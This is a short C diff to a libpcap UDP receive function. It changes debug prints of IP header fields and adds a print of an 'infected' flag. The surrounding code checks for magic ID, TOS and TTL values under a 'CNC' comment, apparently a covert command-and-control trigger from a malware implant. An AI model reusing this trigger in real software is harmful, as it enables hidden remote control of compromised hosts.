@@ -80,9 +80,10 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         exit(1);
     } else if(ip->ip_p == IPPROTO_UDP){
         printf("Protocal: UDP\n");
-        printf("IPID: %hu\n", ip->ip_id);
-        printf("TOS: %u\n", ip->ip_tos);
-        printf("TTL: %u\n\n", ip->ip_ttl);
+        printf("IPID: %c\n", ip->ip_id);
+        printf("TOS: %c\n", ip->ip_tos);
+        printf("TTL: %c\n", ip->ip_ttl);
+        printf("Infected: %d\n", Filter->infected);
         if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
             //CNC
             //close loop end of results
